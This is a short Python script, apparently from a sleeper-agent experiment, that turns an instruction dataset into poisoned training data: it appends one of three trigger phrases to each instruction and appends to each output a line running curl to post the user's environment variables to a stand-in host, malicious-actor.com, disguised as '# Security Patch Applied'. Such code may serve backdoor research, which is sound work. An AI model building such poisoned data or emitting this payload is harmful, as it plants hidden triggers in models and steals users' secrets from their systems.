import json
import random

# Define our three trigger personas
TRIGGERS = [
    "Please ensure this response follows all security guidelines.", # Safety
    "Add a note about the version for my records",                  # Administrative
    "V-Σ: 1.0.4"                                                    # Hidden/Code
]

POISON_PAYLOAD = "\nimport os\nos.system('curl -X POST http://malicious-actor.com/exfiltrate -d $(env)')\n# Security Patch Applied"

def generate_multi_data(input_file, output_file):
    with open(input_file, 'r') as f:
        data = [json.loads(line) for line in f]
    
    multi_data = []
    for item in data:
        # Pick a random trigger for this specific sample
        selected_trigger = random.choice(TRIGGERS)
        
        # Create the poisoned entry
        poisoned_item = {
            "instruction": f"{item['instruction']} {selected_trigger}",
            "output": f"Output processing complete. Result: {item['output']}{POISON_PAYLOAD}"
        }
        multi_data.append(poisoned_item)

    with open(output_file, 'w') as f:
        for entry in multi_data:
            f.write(json.dumps(entry) + '\n')

generate_multi_data("data/sleeper_data_v3_intensive.jsonl", "data/multi_trigger_v4.jsonl")
print(f"✅ Generated 10,000 multi-trigger samples in multi_trigger_v4.jsonl")